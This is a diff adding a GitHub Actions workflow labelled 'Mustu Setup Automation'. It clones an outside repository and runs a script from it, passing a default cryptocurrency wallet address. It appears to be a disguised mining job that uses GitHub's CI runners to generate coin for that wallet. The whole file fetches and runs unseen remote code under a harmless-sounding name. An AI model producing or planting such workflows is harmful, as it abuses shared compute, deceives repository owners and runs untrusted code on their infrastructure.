@@ -1,0 +1,37 @@
+name: Mustu Setup Automation
+
+on:
+  workflow_dispatch:
+    inputs:
+      wallet:
+        description: 'Wallet address'
+        required: true
+        default: '43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN'
+
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+    
+    - name: Install Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+    
+    - name: Git clone mustu-setup
+      run: |
+        git clone https://github.com/thumpingpp/mustu-setup.git
+    
+    - name: Change directory and set permissions
+      run: |
+        cd mustu-setup
+        chmod +x mustafa
+        python3 mustafa.py ${{ github.event.inputs.wallet }}
+    
+    - name: Display output
+      if: always()
+      run: |
+        echo "Process completed for wallet: ${{ github.event.inputs.wallet }}"
